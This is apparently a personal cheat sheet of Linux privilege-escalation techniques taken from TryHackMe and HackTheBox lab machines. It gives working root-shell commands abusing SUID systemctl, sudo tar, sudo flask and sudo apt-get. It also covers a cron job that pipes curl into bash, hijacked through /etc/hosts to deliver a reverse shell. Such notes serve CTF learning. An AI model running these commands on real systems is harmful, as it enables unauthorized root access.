# Ways To Escalate Privileges
This repository contains multiple ways through which I escalated my privileges with multiple machines that I have done on tryhackme and hackthebox.


## SUID /bin/systemctl - Vulnversity
In Linux, SUID (set owner userId upon execution) is a special type of file permission given to a file. SUID gives temporary permissions to a user to run the program/file with the permission of the file owner (rather than the user who runs it).

![Alt text](https://i.imgur.com/ZhaNR2p.jpg)

For example, the binary file to change your password has the SUID bit set on it (/usr/bin/passwd). This is because to change your password, it will need to write to the shadowers file that you do not have access to, root does, so it has root privileges to make the right changes.

### Exploit

sudo sh -c 'cp $(which systemctl) .; chmod +s ./systemctl'
TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "id > /tmp/output"
[Install]
WantedBy=multi-user.target' > $TF
./systemctl link $TF
./systemctl enable --now $TF


## /etc/motd.d Writable Banner - Fowsniff CTF
This file is run as root when a user connects to the machine using SSH. We know this as when we first connect we can see we get given a banner (with fowsniff corp). Look in /etc/update-motd.d/ file. If (after we have put our reverse shell in the cube file) we then include this file in the motd.d file, it will run as root and we will get a reverse shell as root!

### Exploit
https://www.hackingarticles.in/fowsniff-1-vulnhub-walkthrough/


## Overlayfs Exploit (Kernel) - GoldenEye
- For kernel version 3.13.x
- Update gcc to cc in exploit code if gcc is not installed on remote machine.
- Compile exploit using gcc in your own machine.
- ./exploit

## Sudo tar - Bounty Hacker
getting a root shell from tar from gtfobins : 
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh

## sudo /usr/bin/flask - Haskhell
echo 'import pty;pty.spawn("/bin/bash")' > root.py
export FLASK_APP=root.py
sudo /usr/bin/flask run

## Cronjob , Relative Path Given
/etc/crontab : * * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash
We can edit /etc/hosts file so change ip to our machine IP
From our machine setup a python3 http.server and create a file called buildscript.sh and get a reverse shell as root.

## Unusual SUID /usr/sbin/checker - Blog THM
$ find / -perm -u=s -type f 2>/dev/null
$ ltrace /usr/sbin/checker

getenv("admin")                                  = nil
puts("Not an Admin")                             = 13
Not an Admin
+++ exited (status 0) +++

$ export admin=1
$ ltrace checker

getenv("admin")                                  = "1"
setuid(0)                                        = -1
system("/bin/bash")

## Sudo apt-get - Smag Grotto
$ sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh

